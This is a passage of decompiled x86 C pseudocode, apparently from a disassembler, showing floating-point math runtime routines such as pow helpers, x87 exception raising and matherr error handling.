    "      __libm_error_support((__int64 *)&a2, (__int64 *)&a2, (__int64 *)&v25, v24);",
    "      return v25;",
    "    }",
    "    if ( v13 != -1 )",
    "    {",
    "      if ( v13 > 0x7FE )",
    "      {",
    "        if ( (((_WORD)v13 + 1) & 0x7FFu) >= 0x7FF",
    "          && (*(double *)v4.m128i_i64 = a2,",
    "              _mm_cvtsi128_si32(_mm_srli_epi64(v4, 0x20u)) & 0xFFFFF | _mm_cvtsi128_si32(v4)) )",
    "        {",
    "          v24 = 1001;",
    "        }",
    "        else",
    "        {",
    "          *(double *)v23.m128i_i64 = 0.0 / 0.0;",
    "          v24 = 9;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        a1.m128d_f64[0] = a2;",
    "        v23.m128i_i64[0] = 0xFFFFFFFFFFFFFLL;",
    "        if ( _mm_extract_epi16(",
    "               (__m128i)_mm_cmpeq_sd(",
    "                          (__m128d)xmmword_10036730,",
    "                          _mm_or_pd(_mm_and_pd(a1, (__m128d)xmmword_100366C0), (__m128d)xmmword_10036730)),",
    "               0) )",
    "        {",
    "          return INFINITY;",
    "        }",
    "        v24 = 1001;",
    "      }",
    "      goto CALL_LIBM_ERROR_0;",
    "    }",
    "    a1.m128d_f64[0] = a2 * 4.503599627370496e15;",
    "  }",
    "  v14 = i + v13 - 1022;",
    "  v10.m128d_f64[0] = (double)v14;",
    "  v15 = _mm_unpacklo_pd(v10, v10);",
    "  v16 = 0;",
    "  if ( !((v14 << 10) + v6) )",
    "    v16 = 1;",
    "  v17 = _mm_mul_pd(a1, a1);",
    "  v18 = _mm_add_pd(",
    "          _mm_add_pd(v11, _mm_mul_pd(v15, (__m128d)xmmword_10036700)),",
    "          _mm_and_pd(v12, (__m128d)xmmword_10036710[v16]));",
    "  v17.m128d_f64[0] = v17.m128d_f64[0] * v17.m128d_f64[0] * a1.m128d_f64[0];",
    "  v19 = 0.001616102407499711 * a1.m128d_f64[0];",
    "  v20 = _mm_mul_pd(",
    "          _mm_add_pd(",
    "            _mm_mul_pd(_mm_add_pd(_mm_mul_pd((__m128d)xmmword_10036780, a1), (__m128d)xmmword_10036790), a1),",
    "            (__m128d)xmmword_100367A0),",
    "          v17);",
    "  return _mm_unpackhi_pd(v20, v20).m128d_f64[0]",
    "       + v20.m128d_f64[0]",
    "       + v19",
    "       + _mm_unpackhi_pd(v18, v18).m128d_f64[0]",
    "       + v18.m128d_f64[0];",
    "}",
    "",
    "",
    "void __usercall sub_1002BE54(char a1@<ch>, int a2@<ebp>)",
    "{",
    "  *(_BYTE *)(a2 - 144) = -2;",
    "  if ( a1 && !isintTOS() )",
    "    JUMPOUT(0x1002C280);",
    "  _ffexpm1();",
    "  JUMPOUT(0x1002C184);",
    "}",
    "",
    "",
    "void zerotoxdone()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "void expbigret()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "double __fastcall _rtforexpinf(char a1)",
    "{",
    "  if ( a1 )",
    "    JUMPOUT(0x1002C1AA);",
    "  return -0.0;",
    "}",
    "",
    "",
    "// positive sp value has been detected, the output may be wrong!",
    "void __usercall _ffexpm1(int a1@<ebp>, long double a2@<st0>)",
    "{",
    "}int __usercall isintTOS@<eax>(double a1@<st0>)",
    "{",
    "  _ST6 = a1;",
    "  __asm { frndint }",
    "  if ( _ST6 != a1 )",
    "    return notanint();",
    "  _ST5 = a1 * 0.5;",
    "  __asm { frndint }",
    "  if ( _ST5 == a1 * 0.5 )",
    "    return evenint();",
    "  else",
    "    return isintTOSret();",
    "}",
    "",
    "",
    "void isintTOSret()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "void notanint()",
    "{",
    "  isintTOSret();",
    "}",
    "",
    "",
    "void evenint()",
    "{",
    "  isintTOSret();",
    "}",
    "",
    "",
    "double __usercall usepowhlp@<st0>(int a1@<ebp>, double a2@<st1>, __int64 a3@<st0>)",
    "{",
    "  int v4; // eax",
    "  double result; // st7",
    "  double *v6; // [esp+10h] [ebp-7Ch]",
    "  double v7[15]; // [esp+14h] [ebp-78h] BYREF",
    "",
    "  _ESI = v7;",
    "  v6 = v7;",
    "  __asm { fsave   byte ptr [esi+8] }",
    "  v4 = sub_1002CF70(a3, a2, (int)v7);",
    "  __asm { frstor  byte ptr [esi+8] }",
    "  result = v7[0];",
    "  if ( v4 )",
    "    *(_BYTE *)(a1 - 144) = 1;",
    "  return result;",
    "}",
    "",
    "",
    "double __usercall _twoToTOS@<st0>(double a1@<st0>)",
    "{",
    "  _ST6 = a1;",
    "  __asm { frndint }",
    "  return __FSCALE__(__F2XM1__(-(_ST6 - a1)) + 1.0, _ST6);",
    "}",
    "",
    "",
    "double __usercall _convertTOStoQNaN@<st0>(int a1@<eax>, double result@<st0>)",
    "{",
    "  if ( (a1 & 0x80000) == 0 )",
    "    return result + 1.0;",
    "  return result;",
    "}",
    "",
    "",
    "double __fastcall _fload_withFB(int a1, _DWORD *a2)",
    "{",
    "  double result; // st7",
    "",
    "  if ( (a2[1] & 0x7FF00000) != 0x7FF00000 )",
    "    return *(double *)a2;",
    "  *(_QWORD *)&result = *(_QWORD *)a2 << 11;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _checkTOS_withFB(int a1, int a2)",
    "{",
    "  int result; // eax",
    "",
    "  result = a2 & 0x7FF00000;",
    "  if ( (a2 & 0x7FF00000) == 0x7FF00000 )",
    "    return a2;",
    "  return result;",
    "}",
    "",
    "",
    "void _startTwoArgErrorHandling()",
    "{",
    "  JUMPOUT(0x1002C480);",
    "}",
    "",
    "",
    "double __usercall _startOneArgErrorHandling@<st0>(",
    "        int a1@<eax>,",
    "        int a2@<edx>,",
    "        int a3@<ecx>,",
    "        double a4@<st0>,",
    "        __int16 a5,",
    "        int a6,",
    "        int a7,",
    "        int a8)",
    "{",
    "  _DWORD v9[6]; // [esp+0h] [ebp-20h] BYREF",
    "  double v10; // [esp+18h] [ebp-8h]",
    "",
    "  v9[0] = a1;",
    "  v10 = a4;",
    "  v9[1] = a3;",
    "  v9[2] = a7;",
    "  v9[3] = a8;",
    "  _87except(a2, v9, &a5);",
    "  return v10;",
    "}",
    "",
    "",
    "double __cdecl _frnd(double a1)",
    "{",
    "  double result; // st7",
    "",
    "  _ST7 = a1;",
    "  __asm { frndint }",
    "  return result;",
    "}",
    "",
    "",
    "double __usercall sub_1002C4D0@<st0>(int a1@<ebp>, int a2, int a3, int a4, int a5, double a6, int a7)",
    "{",
    "  int v7; // edi",
    "  int v8; // esi",
    "  int v9; // esi",
    "  double result; // st7",
    "  int v11; // [esp+2Ch] [ebp-8Ch] BYREF",
    "  int v12; // [esp+6Ch] [ebp-4Ch]",
    "  int v13; // [esp+ACh] [ebp-Ch]",
    "  void *v14; // [esp+B0h] [ebp-8h]",
    "  void *retaddr; // [esp+B8h] [ebp+0h]",
    "",
    "  v13 = a1;",
    "  v14 = retaddr;",
    "  v7 = a7;",
    "  if ( !sub_1002C610(a2, &a6, a7) )",
    "  {",
    "    v12 &= ~1u;",
    "    sub_1002C970((ULONG_PTR)&v11, (int)&a7, a2, a3, (int)&a4, (int)&a6, 0);",
    "    v7 = a7;",
    "  }",
    "  if ( (a2 & 0x20) != 0 )",
    "  {",
    "    v8 = 5;",
    "  }",
    "  else if ( (a2 & 8) != 0 )",
    "  {",
    "    v8 = 1;",
    "  }",
    "  else if ( (a2 & 4) != 0 )",
    "  {",
    "    v8 = 2;",
    "  }",
    "  else if ( (a2 & 1) != 0 )",
    "  {",
    "    v8 = 3;",
    "  }",
    "  else",
    "  {",
    "    v8 = 2 * (a2 & 2);",
    "  }",
    "  if ( __acrt_has_user_matherr() )",
    "  {",
    "    if ( v8 )",
    "    {",
    "      sub_1002CCE0(v8, a3, a4, a5, 0, 0, a6, v7);",
    "      return result;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v9 = v8 - 1;",
    "    if ( v9 )",
    "    {",
    "      if ( (unsigned int)(v9 - 1) <= 1 )",
    "        *(_DWORD *)sub_1001E025() = 34;",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 33;",
    "    }",
    "  }",
    "  sub_1002BB36();",
    "  return a6;",
    "}",
    "",
    "",
    "BOOL __cdecl sub_1002C610(unsigned int a1, __int64 *a2, __int16 a3)",
    "{",
    "  char v3; // cl",
    "  char v4; // dl",
    "  int v5; // esi",
    "  int v6; // edi",
    "  unsigned int v7; // eax",
    "  double *v8; // eax",
    "  double v9; // xmm0_8",
    "  int v10; // esi",
    "  double v11; // xmm0_8",
    "  unsigned int v12; // edi",
    "  char v13; // cl",
    "  int v14; // eax",
    "  int v15; // edx",
    "  int v16; // eax",
    "  double v17; // xmm0_8",
    "  int v18; // eax",
    "  bool v19; // al",
    "  bool v20; // zf",
    "  double v22; // [esp+14h] [ebp-28h]",
    "  int v23; // [esp+20h] [ebp-1Ch] BYREF",
    "  double v24; // [esp+24h] [ebp-18h]",
    "  BOOL v25; // [esp+2Ch] [ebp-10h]",
    "  int v26; // [esp+30h] [ebp-Ch]",
    "  int v27; // [esp+34h] [ebp-8h]",
    "  char v28; // [esp+3Bh] [ebp-1h]",
    "",
    "  v3 = a1;",
    "  v4 = a3;",
    "  v5 = 0;",
    "  v6 = a1 & 0x1F;",
    "  v27 = v6;",
    "  if ( (a1 & 8) != 0 && (a3 & 1) != 0 )",
    "  {",
    "    v5 = 1;",
    "    v6 = a1 & 0x17;",
    "    goto LABEL_61;",
    "  }",
    "  if ( ((unsigned __int8)a3 & (unsigned __int8)a1 & 4) != 0 )",
    "  {",
    "    v5 = 4;",
    "    v6 = a1 & 0x1B;",
    "    goto LABEL_61;",
    "  }",
    "  if ( (a1 & 1) != 0 && (a3 & 8) != 0 )",
    "  {",
    "    v5 = 8;",
    "    v7 = a3 & 0xC00;",
    "    if ( v7 > 0x800 )",
    "    {",
    "      if ( v7 != 3072 )",
    "        goto LABEL_24;",
    "      v8 = (double *)a2;",
    "      if ( *(double *)a2 > 0.0 )",
    "      {",
    "        v6 = a1 & 0x1E;",
    "        *a2 = 0x7FEFFFFFFFFFFFFFLL;",
    "        goto LABEL_61;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      if ( v7 != 2048 )",
    "      {",
    "        if ( (a3 & 0xC00) != 0 )",
    "        {",
    "          if ( v7 == 1024 )",
    "          {",
    "            v6 = a1 & 0x1E;",
    "            if ( *(double *)a2 <= 0.0 )",
    "              *(double *)a2 = -INFINITY;",
    "            else",
    "              *a2 = 0x7FEFFFFFFFFFFFFFLL;",
    "            goto LABEL_61;",
    "          }",
    "LABEL_24:",
    "          v6 = a1 & 0x1E;",
    "          goto LABEL_61;",
    "        }",
    "        v8 = (double *)a2;",
    "        v9 = INFINITY;",
    "        if ( *(double *)a2 <= 0.0 )",
    "        {",
    "          v6 = a1 & 0x1E;",
    "          *(double *)a2 = -INFINITY;",
    "          goto LABEL_61;",
    "        }",
    "LABEL_23:",
    "        *v8 = v9;",
    "        goto LABEL_24;",
    "      }",
    "      v8 = (double *)a2;",
    "      if ( *(double *)a2 > 0.0 )",
    "      {",
    "        v6 = a1 & 0x1E;",
    "        *a2 = 0x7FF0000000000000LL;",
    "        goto LABEL_61;",
    "      }",
    "    }",
    "    v9 = -1.797693134862316e308;",
    "    goto LABEL_23;",
    "  }",
    "  if ( (a1 & 2) != 0 && (a3 & 0x10) != 0 )",
    "  {",
    "    v10 = (a1 >> 4) & 1;",
    "    if ( *(double *)a2 == 0.0 )",
    "    {",
    "      v10 = 1;",
    "      goto LABEL_60;",
    "    }",
    "    v24 = sub_1002CDE0(*a2, &v23);",
    "    v11 = v24;",
    "    v22 = v24;",
    "    HIDWORD(v24) = v23 - 1536;",
    "    if ( v23 - 1536 < -1074 )",
    "    {",
    "      v10 = 1;",
    "      v3 = a1;",
    "      v4 = a3;",
    "      *(double *)a2 = v11 * 0.0;",
    "LABEL_60:",
    "      v6 &= ~2u;",
    "      v5 = v10 != 0 ? 0x10 : 0;",
    "      goto LABEL_61;",
    "    }",
    "    v12 = LODWORD(v22);",
    "    v13 = 0;",
    "    v25 = v11 < 0.0;",
    "    v28 = 0;",
    "    v14 = BYTE6(v22) & 0xF | 0x10;",
    "    HIWORD(v22) = BYTE6(v22) & 0xF | 0x10;",
    "    LOBYTE(v14) = 0;",
    "    v26 = v14;",
    "    if ( v23 - 1536 < -1021 )",
    "    {",
    "      v15 = -1021 - HIDWORD(v24);",
    "      HIDWORD(v24) = 1;",
    "      do",
    "      {",
    "        v13 = v12 & 1;",
    "        if ( (v12 & 1) != 0 && !v10 )",
    "          v10 = HIDWORD(v24);",
    "        v16 = (unsigned __int8)v26;",
    "        if ( v28 )",
    "          v16 = HIDWORD(v24);",
    "        v12 >>= 1;",
    "        v26 = v16;",
    "        v28 = v13;",
    "        LODWORD(v22) = v12;",
    "        if ( (BYTE4(v22) & 1) != 0 )",
    "        {",
    "          v12 |= 0x80000000;",
    "          LODWORD(v22) = v12;",
    "        }",
    "        HIDWORD(v22) >>= 1;",
    "        --v15;",
    "      }",
    "      while ( v15 );",
    "      LOBYTE(v14) = v26;",
    "      v28 = v13;",
    "    }",
    "    v17 = v22;",
    "    if ( v25 )",
    "    {",
    "      v17 = -v22;",
    "      v22 = v17;",
    "      v12 = LODWORD(v17);",
    "    }",
    "    v24 = v17;",
    "    if ( !v13 && !(_BYTE)v14 )",
    "    {",
    "LABEL_58:",
    "      v6 = v27;",
    "      v3 = a1;",
    "      v4 = a3;",
    "      *(double *)a2 = v17;",
    "      goto LABEL_60;",
    "    }",
    "    v18 = sub_100276C0();",
    "    if ( v18 > 512 )",
    "      goto LABEL_57;",
    "    switch ( v18 )",
    "    {",
    "      case 512:",
    "        v19 = !v25;",
    "        break;",
    "      case 0:",
    "        if ( !v28 )",
    "          goto LABEL_57;",
    "        if ( (_BYTE)v26 )",
    "        {",
    "LABEL_56:",
    "          LODWORD(v22) = v12 + 1;",
    "          HIDWORD(v22) += __CFADD__(v12, 1);",
    "          v17 = v22;",
    "          goto LABEL_58;",
    "        }",
    "        v20 = (LOBYTE(v22) & 1) == 0;",
    "        goto LABEL_55;",
    "      case 256:",
    "        v19 = v25;",
    "        break;",
    "      default:",
    "        goto LABEL_57;",
    "    }",
    "    v20 = !v19;",
    "LABEL_55:",
    "    if ( !v20 )",
    "      goto LABEL_56;",
    "LABEL_57:",
    "    v17 = v24;",
    "    goto LABEL_58;",
    "  }",
    "LABEL_61:",
    "  if ( (v3 & 0x10) != 0 && (v4 & 0x20) != 0 )",
    "  {",
    "    v5 |= 0x20u;",
    "    v6 &= ~0x10u;",
    "  }",
    "  if ( v5 )",
    "    _set_statfp();",
    "  return v6 == 0;",
    "}",
    "",
    "",
    "int __cdecl _raise_exc(ULONG_PTR Arguments, int a2, int a3, int a4, int a5, int a6)",
    "{",
    "  return sub_1002C970(Arguments, a2, a3, a4, a5, a6, 0);",
    "}",
    "",
    "",
    "unsigned int __usercall sub_1002C970@<eax>(",
    "        __int16 a1@<fpstat>,",
    "        unsigned int *Arguments,",
    "        unsigned int *a3,",
    "        char a4,",
    "        int a5,",
    "        unsigned int *a6,",
    "        unsigned int *a7,",
    "        int a8)",
    "{",
    "  char v8; // cl",
    "  DWORD v9; // edi",
    "  unsigned int *v10; // esi",
    "  char v11; // al",
    "  __int16 v12; // fps",
    "  unsigned int v13; // eax",
    "  int v14; // eax",
    "  unsigned int *v15; // ecx",
    "  unsigned int v16; // eax",
    "  unsigned int *v17; // ebx",
    "  ULONG_PTR v18; // ecx",
    "  int v19; // eax",
    "  int v20; // eax",
    "  unsigned int result; // eax",
    "",
    "  v8 = a4;",
    "  Arguments[1] = 0;",
    "  v9 = -1073741811;",
    "  Arguments[2] = 0;",
    "  Arguments[3] = 0;",
    "  if ( (v8 & 0x10) != 0 )",
    "  {",
    "    v9 = -1073741681;",
    "    Arguments[1] |= 1u;",
    "  }",
    "  if ( (v8 & 2) != 0 )",
    "  {",
    "    v9 = -1073741677;",
    "    Arguments[1] |= 2u;",
    "  }",
    "  if ( (v8 & 1) != 0 )",
    "  {",
    "    v9 = -1073741679;",
    "    Arguments[1] |= 4u;",
    "  }",
    "  if ( (v8 & 4) != 0 )",
    "  {",
    "    v9 = -1073741682;",
    "    Arguments[1] |= 8u;",
    "  }",
    "  if ( (v8 & 8) != 0 )",
    "  {",
    "    v9 = -1073741680;",
    "    Arguments[1] |= 0x10u;",
    "  }",
    "  v10 = a3;",
    "  Arguments[2] ^= (Arguments[2] ^ ~(16 * *a3)) & 0x10;",
    "  Arguments[2] ^= (Arguments[2] ^ ~(2 * *v10)) & 8;",
    "  Arguments[2] ^= (Arguments[2] ^ ~(*v10 >> 1)) & 4;",
    "  Arguments[2] ^= (Arguments[2] ^ ~(*v10 >> 3)) & 2;",
    "  Arguments[2] ^= (Arguments[2] ^ ~(*v10 >> 5)) & 1;",
    "  v11 = _statfp(a1);",
    "  if ( (v11 & 1) != 0 )",
    "    Arguments[3] |= 0x10u;",
    "  if ( (v11 & 4) != 0 )",
    "    Arguments[3] |= 8u;",
    "  if ( (v11 & 8) != 0 )",
    "    Arguments[3] |= 4u;",
    "  if ( (v11 & 0x10) != 0 )",
    "    Arguments[3] |= 2u;",
    "  if ( (v11 & 0x20) != 0 )",
    "    Arguments[3] |= 1u;",
    "  v13 = *v10 & 0xC00;",
    "  if ( v13 > 0x800 )",
    "  {",
    "    if ( v13 == 3072 )",
    "      *Arguments |= 3u;",
    "  }",
    "  else if ( v13 == 2048 )",
    "  {",
    "    *Arguments = *Arguments & 0xFFFFFFFC | 2;",
    "  }",
    "  else if ( v13 )",
    "  {",
    "    if ( v13 == 1024 )",
    "      *Arguments = *Arguments & 0xFFFFFFFC | 1;",
    "  }",
    "  else",
    "  {",
    "    *Arguments &= 0xFFFFFFFC;",
    "  }",
    "  v14 = *v10 & 0x300;",
    "  switch ( v14 )",
    "  {",
    "    case 0:",
    "      v15 = Arguments;",
    "      v16 = *Arguments & 0xFFFFFFE3 | 8;",
    "      goto LABEL_36;",
    "    case 512:",
    "      v15 = Arguments;",
    "      v16 = *Arguments & 0xFFFFFFE3 | 4;",
    "LABEL_36:",
    "      *v15 = v16;",
    "      break;",
    "    case 768:",
    "      *Arguments &= 0xFFFFFFE3;",
    "      break;",
    "  }",
    "  v17 = a7;",
    "  *Arguments ^= (*Arguments ^ (32 * a5)) & 0x1FFE0;",
    "  Arguments[8] |= 1u;",
    "  if ( a8 )",
    "  {",
    "    Arguments[8] &= 0xFFFFFFE1;",
    "    Arguments[4] = *a6;",
    "    Arguments[24] |= 1u;",
    "    Arguments[24] &= 0xFFFFFFE1;",
    "    Arguments[20] = *v17;",
    "  }",
    "  else",
    "  {",
    "    Arguments[8] = Arguments[8] & 0xFFFFFFE1 | 2;",
    "    *((_QWORD *)Arguments + 2) = *(_QWORD *)a6;",
    "    Arguments[24] |= 1u;",
    "    Arguments[24] = Arguments[24] & 0xFFFFFFE1 | 2;",
    "    *((_QWORD *)Arguments + 10) = *(_QWORD *)v17;",
    "  }",
    "  _clrfp(v12);",
    "  RaiseException(v9, 0, 1u, (const ULONG_PTR *)&Arguments);",
    "  v18 = (ULONG_PTR)Arguments;",
    "  if ( (Arguments[2] & 0x10) != 0 )",
    "    *v10 &= ~1u;",
    "  if ( (*(_BYTE *)(v18 + 8) & 8) != 0 )",
    "    *v10 &= ~4u;",
    "  if ( (*(_BYTE *)(v18 + 8) & 4) != 0 )",
    "    *v10 &= ~8u;",
    "  if ( (*(_BYTE *)(v18 + 8) & 2) != 0 )",
    "    *v10 &= ~0x10u;",
    "  if ( (*(_BYTE *)(v18 + 8) & 1) != 0 )",
    "    *v10 &= ~0x20u;",
    "  switch ( *(_DWORD *)v18 & 3 )",
    "  {",
    "    case 0:",
    "      *v10 &= 0xFFFFF3FF;",
    "      break;",
    "    case 1:",
    "      *v10 = *v10 & 0xFFFFF3FF | 0x400;",
    "      break;",
    "    case 2:",
    "      *v10 = *v10 & 0xFFFFF3FF | 0x800;",
    "      break;",
    "    case 3:",
    "      *v10 |= 0xC00u;",
    "      break;",
    "  }",
    "  v19 = (*(_DWORD *)v18 >> 2) & 7;",
    "  if ( !v19 )",
    "  {",
    "    result = *v10 & 0xFFFFF0FF | 0x300;",
    "    goto LABEL_61;",
    "  }",
    "  v20 = v19 - 1;",
    "  if ( !v20 )",
    "  {",
    "    result = *v10 & 0xFFFFF1FF | 0x200;",
    "LABEL_61:",
    "    *v10 = result;",
    "    goto LABEL_62;",
    "  }",
    "  result = v20 - 1;",
    "  if ( !result )",
    "    *v10 &= 0xFFFFF3FF;",
    "LABEL_62:",
    "  if ( a8 )",
    "  {",
    "    result = *(_DWORD *)(v18 + 80);",
    "    *v17 = result;",
    "  }",
    "  else",
    "  {",
    "    *(_QWORD *)v17 = *(_QWORD *)(v18 + 80);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "_DWORD *__cdecl _set_errno_from_matherr(int a1)",
    "{",
    "  _DWORD *result; // eax",
    "",
    "  if ( a1 == 1 )",
    "  {",
    "    result = sub_1001E025();",
    "    *result = 33;",
    "  }",
    "  else if ( a1 == 2 || (result = (_DWORD *)(a1 - 3), a1 == 3) )",
    "  {",
    "    result = sub_1001E025();",
    "    *result = 34;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "double __cdecl sub_1002CCE0(int a1, int a2, int a3, int a4, int a5, int a6, double a7)",
    "{",
    "  int v7; // eax",
    "  double result; // st7",
    "  int v9; // [esp+0h] [ebp-20h] BYREF",
    "  char *v10; // [esp+4h] [ebp-1Ch]",
    "  int v11; // [esp+8h] [ebp-18h]",
    "  int v12; // [esp+Ch] [ebp-14h]",
    "  int v13; // [esp+10h] [ebp-10h]",
    "  int v14; // [esp+14h] [ebp-Ch]",
    "  double v15; // [esp+18h] [ebp-8h]",
    "",
    "  v7 = 0;",
    "  while ( dword_100368A8[2 * v7] != a2 )",
    "  {",
    "    if ( ++v7 >= 29 )",
    "    {",
    "      v10 = 0;",
    "LABEL_5:",
    "      sub_1002BB36();",
    "      if ( a1 == 1 )",
    "      {",
    "        *(_DWORD *)sub_1001E025() = 33;",
    "      }",
    "      else if ( a1 == 2 || a1 == 3 )",
    "      {",
    "        result = a7;",
    "        *(_DWORD *)sub_1001E025() = 34;",
    "        return result;",
    "      }",
    "      return a7;",
    "    }",
    "  }",
    "  v10 = (&off_100368AC)[2 * v7];",
    "  if ( !v10 )",
    "    goto LABEL_5;",
    "  v11 = a3;",
    "  v12 = a4;",
    "  v13 = a5;",
    "  v14 = a6;",
    "  v15 = a7;",
    "  v9 = a1;",
    "  sub_1002BB36();",
    "  if ( !sub_100253D0((int)&v9) )",
    "  {",
    "    if ( a1 == 1 )",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 33;",
    "    }",
    "    else if ( (unsigned int)(a1 - 2) <= 1 )",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 34;",
    "      return v15;",
    "    }",
    "  }",
    "  return v15;",
    "}",
    "",
    "",
    "double __cdecl sub_1002CDE0(double a1, int *a2)",
    "{",
    "  double result; // st7",
    "  int v4; // esi",
    "  int v5; // esi",
    "  unsigned __int64 v6; // rax",
    "  int v7; // edx",
    "  unsigned int v8; // ecx",
    "  unsigned int v9; // [esp+0h] [ebp-10h]",
    "  int v10; // [esp+1Ch] [ebp+Ch]",
    "",
    "  if ( a1 == 0.0 )",
    "  {",
    "    result = 0.0;",
    "    *a2 = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( (HIDWORD(a1) & 0x7FF00000) != 0 || !(HIDWORD(a1) & 0xFFFFF | LODWORD(a1)) )",
    "    {",
    "      v9 = LODWORD(a1);",
    "      v8 = HIDWORD(a1) & 0x800FFFFF | 0x3FE00000;",
    "      v7 = ((HIDWORD(a1) >> 20) & 0x7FF) - 1022;",
    "    }",
    "    else",
    "    {",
    "      if ( !_BitScanReverse((unsigned int *)&v4, HIDWORD(a1) & 0xFFFFF) )",
    "        _BitScanReverse((unsigned int *)&v5, LODWORD(a1));",
    "      else",
    "        v5 = v4 + 32;",
    "      v6 = __PAIR64__(HIDWORD(a1) & 0xFFFFF, LODWORD(a1)) << (52 - (unsigned __int8)v5);",
    "      HIDWORD(v6) &= ~0x100000u;",
    "      if ( a1 < 0.0 )",
    "        HIDWORD(v6) |= 0x80000000;",
    "      v10 = HIDWORD(v6);",
    "      v7 = v5 - 1073;",
    "      v9 = v6;",
    "      v8 = v10 & 0x800FFFFF | 0x3FE00000;",
    "    }",
    "    result = COERCE_DOUBLE(__PAIR64__(v8, v9));",
    "    *a2 = v7;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1002CEF0(int a1, int a2)",
    "{",
    "  if ( a1 )",
    "    goto LABEL_6;",
    "  if ( a2 == 2146435072 )",
    "    return 1;",
    "  if ( a2 == -1048576 )",
    "    return 2;",
    "LABEL_6:",
    "  if ( (a2 & 0x7FF80000) == 0x7FF80000 )",
    "    return 3;",
    "  if ( (a2 & 0x7FF00000) == 0x7FF00000 && (a1 || (a2 & 0x7FFFFFFF) != 0x7FF00000) )",
    "    return 4;",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_1002CF70(__int64 a1, double a2, unsigned __int64 *a3)",
    "{",
    "  double v3; // xmm0_8",
    "  unsigned __int64 v4; // xmm1_8",
    "  unsigned __int64 *v6; // eax",
    "  __int64 v7; // xmm0_8",
    "  __int64 *v8; // eax",
    "  int v9; // eax",
    "",
    "  v3 = fabs(*(double *)&a1);",
    "  if ( !LODWORD(a2) )",
    "  {",
    "    if ( HIDWORD(a2) == 2146435072 )",
    "    {",
    "      v4 = 0x3FF0000000000000LL;",
    "      if ( v3 > 1.0 )",
    "      {",
    "LABEL_4:",
    "        *a3 = 0x7FF0000000000000LL;",
    "        return 0;",
    "      }",
    "      v6 = a3;",
    "      if ( v3 < 1.0 )",
    "      {",
    "        *a3 = 0;",
    "        return 0;",
    "      }",
    "      goto LABEL_31;",
    "    }",
    "    if ( a2 == -INFINITY )",
    "    {",
    "      v4 = 0x3FF0000000000000LL;",
    "      if ( v3 > 1.0 )",
    "      {",
    "        *a3 = 0;",
    "        return 0;",
    "      }",
    "      v6 = a3;",
    "      if ( v3 < 1.0 )",
    "      {",
    "        *a3 = 0x7FF0000000000000LL;",
    "        return 0;",
    "      }",
    "      goto LABEL_31;",
    "    }",
    "  }",
    "  if ( !(_DWORD)a1 )",
    "  {",
    "    if ( HIDWORD(a1) == 2146435072 )",
    "    {",
    "      v7 = 0;",
    "      if ( a2 > 0.0 )",
    "        goto LABEL_4;",
    "      v8 = (__int64 *)a3;",
    "      if ( a2 >= 0.0 )",
    "      {",
    "        *a3 = 0x3FF0000000000000LL;",
    "        return 0;",
    "      }",
    "LABEL_34:",
    "      *v8 = v7;",
    "      return 0;",
    "    }",
    "    if ( a1 == 0xFFF0000000000000uLL )",
    "    {",
    "      if ( (sub_1002D277(*(__int64 *)&a2) & 0x90) != 0 || _frnd(a2) != a2 )",
    "      {",
    "        v9 = 0;",
    "      }",
    "      else if ( _frnd(a2 * 0.5) == a2 * 0.5 )",
    "      {",
    "        v9 = 2;",
    "      }",
    "      else",
    "      {",
    "        v9 = 1;",
    "      }",
    "      v4 = 0;",
    "      if ( a2 <= 0.0 )",
    "      {",
    "        if ( a2 < 0.0 )",
    "        {",
    "          if ( v9 == 1 )",
    "            v4 = 0x8000000000000000uLL;",
    "          v6 = a3;",
    "LABEL_31:",
    "          *v6 = v4;",
    "          return 0;",
    "        }",
    "        v7 = 0x3FF0000000000000LL;",
    "      }",
    "      else",
    "      {",
    "        v7 = 0x7FF0000000000000LL;",
    "        if ( v9 == 1 )",
    "        {",
    "          *(double *)a3 = -INFINITY;",
    "          return 0;",
    "        }",
    "      }",
    "      v8 = (__int64 *)a3;",
    "      goto LABEL_34;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "_DWORD *__usercall _87except@<eax>(int a1@<ebp>, int a2, int a3, __int16 *a4)",
    "{",
    "  __int16 v4; // cx",
    "  int v5; // edi",
    "  _DWORD *result; // eax",
    "  unsigned int v7; // [esp-94h] [ebp-A0h]",
    "  int v8; // [esp-84h] [ebp-90h] BYREF",
    "  _QWORD v9[8]; // [esp-80h] [ebp-8Ch] BYREF",
    "  unsigned int v10; // [esp-40h] [ebp-4Ch]",
    "  int v11; // [esp+0h] [ebp-Ch]",
    "  void *v12; // [esp+4h] [ebp-8h]",
    "  void *retaddr; // [esp+Ch] [ebp+0h]",
    "",
    "  v11 = a1;",
    "  v12 = retaddr;",
    "  v4 = *a4;",
    "  v8 = (unsigned __int16)*a4;",
    "  switch ( *(_DWORD *)a3 )",
    "  {",
    "    case 1:",
    "      goto LABEL_11;",
    "    case 2:",
    "      v7 = 4;",
    "      break;",
    "    case 3:",
    "      v7 = 17;",
    "      break;",
    "    case 4:",
    "      v7 = 18;",
    "      break;",
    "    case 5:",
    "LABEL_11:",
    "      v7 = 8;",
    "      break;",
    "    case 8:",
    "      v7 = 16;",
    "      break;",
    "    default:",
    "      goto LABEL_19;",
    "  }",
    "  v5 = v7;",
    "  if ( !sub_1002C610(v7, (__int64 *)(a3 + 24), v4) )",
    "  {",
    "    if ( a2 == 16 || a2 == 22 || a2 == 29 )",
    "    {",
    "      v9[6] = *(_QWORD *)(a3 + 16);",
    "      v10 = v10 & 0xFFFFFFE0 | 3;",
    "    }",
    "    else",
    "    {",
    "      v10 &= ~1u;",
    "    }",
    "    _raise_exc((ULONG_PTR)v9, (int)&v8, v5, a2, a3 + 8, a3 + 24);",
    "  }",
    "LABEL_19:",
    "  sub_1002BB36();",
    "  if ( *(_DWORD *)a3 == 8 )",
